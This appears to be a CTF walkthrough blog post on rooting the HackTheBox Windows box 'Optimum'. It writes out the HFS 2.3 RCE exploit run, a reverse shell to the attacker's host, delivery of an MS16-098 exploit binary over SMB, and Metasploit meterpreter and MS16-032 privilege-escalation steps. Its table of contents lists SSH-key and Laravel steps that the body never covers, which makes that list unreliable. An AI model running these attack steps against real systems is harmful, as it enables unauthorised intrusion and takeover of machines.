@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Optimum Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-optimum-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-16T15:08:31+00:00">April 16, 2018</time><time class="updated" datetime="2025-07-05T18:37:42+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Optimum is an “easy” rated Windows CTF box on HackTheBox platform. The box includes exploitation of 2 CVEs and is considerably easy to exploit. It teaches basics on running public exploit and reconnaissance. Let’s see how we root the box.</span></p>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Finding public exploit for HFS</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation – Method 1</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Modifying HFS RCE Exploit</span></li>
+<li><span style="color: #000000;">Exploiting HFS 2.3</span></li>
+<li><span style="color: #000000;">Initial information gathering</span></li>
+<li><span style="color: #000000;">Setting up my SSH key in the victim’s authorized_keys file</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation – Method 1</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Tunnelling internal website to our system</span></li>
+<li><span style="color: #000000;">Exploiting Laravel <a style="color: #000000;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129">CVE-2021-3129</a>to snag root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation – Method 2</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit rejetto_hfs_exec module</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation – Method 2</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit ms16_032_secondary_logon_privesc module</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">Firstly, we will run a nmap scan on the victim machine with IP address <strong>10.129.201.66. </strong>It showed us that HFS version 2.3 was running on port 80.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.201.66</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTMyYpyViXxKWXmUv64gMSIDhjBjTkhv3kdEt4BobPYwgAOSZvDRTTvhmaWxypi0ZIaozBL3LknR0NZsPEZe9Kti7ytIzphUs07-fEnCioZlPSN5nfP3ML3JZFgp4apR5NguS-fXrH6R6VwaVVBXdhA3Du6SgaDk6HVcpKKDE6yB0-WSU0y7qyiXux_Q/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Upon looking for HFS v2.3 exploits on exploit-db using searchsploit we found an RCE exploit 39161.py</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit hfs
+searchsploit -m 39161</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAne-KEQZlXMKiUaUyLvlbAOqqcmT3Fhqko-CwQbNjAmwmimzLVsAHD2mJgL1q7jxZe3Kn6EekQ5Ij1qxdAe1p2ff1ulPyufQrbONdRc7KJe9aPEXszkz-ETclKC48nUiK4iSbKKie3Gk25FHUZHiiAQctI6loVupt1iE1s5fO50DCvxXPdJN0wkr36w/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation – Method 1</span></h3>
+<p><span style="color: #000000;">Upon reading the source code, we found the correct way to run this exploit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBUpL3DD7OGY6IXbuK26CxcBKtFlO-Zw4lC41G7ISGGzIwKBnhVEDxSftFuKLlse71u2VMcMops3mCmh5zW33HSjvT0VbmrW3rDfAt0WeVlUa4bbtemD5FVBlYLj8P5Z4RlwmOcTRK_Z3QyW17qYdfm1_zwzJsyqxfgbrql3bEKd7Wrb4lUNV2FAE5hw/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Thus, according to the exploit, we need to set up a web server that hosts a nc.exe binary. Since hfs.exe runs on Windows, we require a valid exe. This exe is available by default in Kali linux under the folder <strong>/usr/share/windows-binaries</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZpC_BP9Y92nvpsztF0UWW9UJ352ANi2-QknA3PMYfUvb8d2rJAtxbP4C5P7CFE8zX1W4LLH5p32II3McSdrxHavVhOlRvz_SzylAIjTAIIeGBQ3McBIyxSLoDudxKUM8q0bHQAZvDHF93FjMweVMc69dVsh-pm74ogRzZTuCNah88AUrqiERVdDF9Sw/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Now that we have done that, we need to edit the source code a bit more. We need to tidy it up by removing comments and instructions and also put in our local (Kali) IP address and Port on which we want to receive reverse connection. Here, 10.10.14.123 and 1234 port.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvbYBG-K732wECyB9CpuvcI8IKzg6Hp3s6kXqyryaYNWiHDDp-677Hgge4hKNbVpk5GDerJQh7sfvgVHBQhufVuZecs40b3wNS7SQJak6pY2EtICRQlrzjV6hiHJR5rxzisbWgZFb07OS87g_4yDoF_fJla26okPn8VBoyvOeQ_DMy8a3NHHkalytGNQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Essentially, this exploit will execute commands on the HFS server and provide a reverse shell on port 1234. For that we will set up a netcat reverse listener on port 1234 later.</span></p>
+<p><span style="color: #000000;">Then, we can run the exploit using the command:</span></p>
+<p><span style="color: #000000;">python3 exploit.py &lt;target IP&gt; &lt;target port&gt;</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 39161.py 10.129.201.66 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVZhi_PE0TQ_YnAhRHlGr2TcI_88vu0_WA8ve4J8okBUip2KalQe6x18HWJ2xYqh4C829RjPpW4iXsK-E0gCA6a2Jgt9mC-8CGTy8hmMF3UsDcMs4aQ6c8j0y_qQtKF0ftDVl8lnx0q4dDc-xjPHlvmQWnEapbGzzqOdThd_dakc2N-x3QH11shzp4UQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Then, we set up a reverse listener before we execute this command. Then upon successful execution we will receive a reverse shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -nlvp 1234
+systeminfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx_4QNP1zPcCn6FYBBsNNhMVtCsg3fRaPBqlgtJzGhUdwr8k9diIDh-U_1KKaVGD9eokABwhZD91MztpEbbWmdM4NyfHD_En96AZL1eiAax7-4MMcRKlMBoo9cKS-aRZZk43kZr6Q85FOEXFlzHPOBPaDReHKl4J6Cq_PjmBa1VWFpFdAoozZa2fOMtg/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation – Method 1</span></h3>
+<p><span style="color: #000000;">As seen in the screenshot above, the version of Windows mentioned above is vulnerable to post exploitation vulnerability MS16-098 as mentioned in the bulletin post <a style="color: #000000;" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098">here</a>. The exploit is available on exploit-db.com</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlZSqXu-fIAZoaZihPJVhK5xE3ZJx_K4QnPJnE2455D0cdqPpXJtNnA56_63QCop2hqTgxogK1WjE0-SQrXVbXusJUxWWL5bHodl36x4FHxLT5-37TU0C7rSYLXKz3POz8eC3D0Ui6De8SPhr4jNVsso9HJFptB31HGj4HJ-6c5JwbZaIEpc4ZX23ubQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">As you can see, binary of this exploit is available on the link mentioned in the source code. Let’s download this binary and host it in our SMB Server. We can create a manual SMB server or use impacket-smbserver to do the same.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+impacket-smbserver share $(pwd) -smb2support</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyuVrrnqbIOmoA_os-cTkTl3Y2mbCIJyvsbt6riaDjdjB_I-1moAubuCPbZjQcYSQzIHv-x7faa6h9TzSiO3Uwnr8bFt6b6obDo4EMuhFfat-Tv9eOaCgOV0Lg1PswWLl-W7a_YcLl5BPsKiJGHj2KxKncsp4lOqTIExU57XG1d0MLt4vf5-qn0aYZRQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Then, on the shell that we had earlier obtained, let’s download this exploit using the copy command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\\users\\public
+copy \\10.10.14.123\share\41020.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZXYWFJ-7dQ_PyyuJ-kQ7FakoCEkH96FY8D-o2EhCu1U9WppWalH_SsGdLN9MzhLyh7tOA1Gj_ON_tb3XSe0TUZoc_Rym9LpKIdrJt0bJeZgseegEOicLV160P3j8dhuHTDoHg1VbYqhKPWSBEoxapt1ZmiAixooUV4L-Stw226O6VP5kh0ejWB57JrQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now that the exploit has been downloaded, we run this and obtain SYSTEM privileges!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJH3HtS4w_o2laGOYszRfTW3zUtmNzxQcrxLvlqZTYu_o6KMaUMnFaJHVhvvY5cuyML0XRvnEWZjZ3dEAOnGAChem3pr-yg9zDvWkrpURyV4amFiesEqDli7rMwq6kSkCLZ1CFpq9COESgSaN_yKoj8Z7x3Z-ioX49YPYA_bF1ylWe82d7zIYy11ZThQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation – Method 2</span></h3>
+<p><span style="color: #000000;">To ease up the things, HFS v2.3 exploit is available in Metasploit too. We’ll just fire up Metasploit and execute the exploit</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/http/rejetto_hfs_exec
+set payload windows/x64/meterpreter/reverse_tcp
+set rhosts 10.129.201.66
+set lhost 10.10.14.123
+set srvhost 10.10.14.123
+exploit
+sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjT5-lFlo9y2DIMpIpOq9pro0m-MjZLPsTCHFvW4R9O6Ab4wFlUjAKmq6EOhwheSDvHAfsNa40OrxIJyBJrOkqFnumJL8f0e0P7nyr-vyZ_-qh8g0AK3egyC6AEbs_fxfyykmu00-7hALniVN75M-QZMrAbibhc_rYl9ssE4Y5my7egY_V3wMqk1SDD8w/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">And just like that, we have a working meterpreter session! Now we can proceed for privilege escalation.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation – Method 2</span></h3>
+<p><span style="color: #000000;">When you obtain a valid session, you can escalate privileges using the <strong>ms16_032_secondary_logon_privesc</strong> module. This module exploits the lack of sanitization of standard handles in Windows’ Secondary Logon Service. It duplicates a Logon Handle and impersonates privileged token to gain privilege escalation. You can read more about the vulnerability <a style="color: #000000;" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032">here</a>.</span></p>
+<p><span style="color: #000000;">Then, to launch this, we need to set the active session of vulnerable Windows version and the local host</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ ms16_032_secondary_logon_privesc
+set session 3
+set lhost 10.10.14.123
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfp8nKpfEJOKSKzMfCUiKvvYe32aFf3_Wkdu_0IEGb5CciT-M6fr_MYrbQjD5ugwSEYHgBxJ5XHYaJn7Rve0VUpzZ90a3OmOehBiijkvopQiTw431XjsKa3DZWNeYFYe05_LB2mpNwd5c4MooHOaBPT27B62vYpoBctWpklOcgut9QAIC2CQ7vIx-pog/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">As you can see, a new meterpreter session will now be opened which has cached a privileged token that the module earlier obtained. To get SYSTEM privileges,</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
+getuid</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0aD5m6-nmDx2ZJoZQiN0HLBqobJgMNb5pJUyFGLWBsI0XW_L5BvVvPE2so0ubDnRChEhS6t7hQobZX6NU2bo9FpBCpiw9RdoMHafizg7D_MJL1jEPosGHP8zT95kVOdCOc73DztY4PCbZWxGjaXNhI6J6ZCZ4aNvZkxzOwHK6rA97hQ7m_8O_KYRvEA/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Now that we have SYSTEM privileges, we can snag the respective user and root flags. The user flag is available at “C:\users\kostas\Desktop” and root flag at “C:\Users\Administrator\Desktop”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAhhTun00-UrFPWlb97rst7KD6N7YVpYSKnmTEVrPOzKK7QcuUc710s3oX90oWb-lKlpMuO4kziwXCifhFRnhyvRBJ912yzRFI-hab2zJRAVv5VFGJJ6Ruq909YHyQIbWAh5L8fvBGP4rUb2bpf9JZploxO_kmK_2e8Pi1fe7VW7cAO7OZOdnWbF50Jw/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Let’s read the congratulatory flag and end our CTF challenge!</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">In the article, we demonstrated two methods to root the box Optimum on HackTheBox. It is a beginner-friendly box and gives a user brief on running public exploits. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
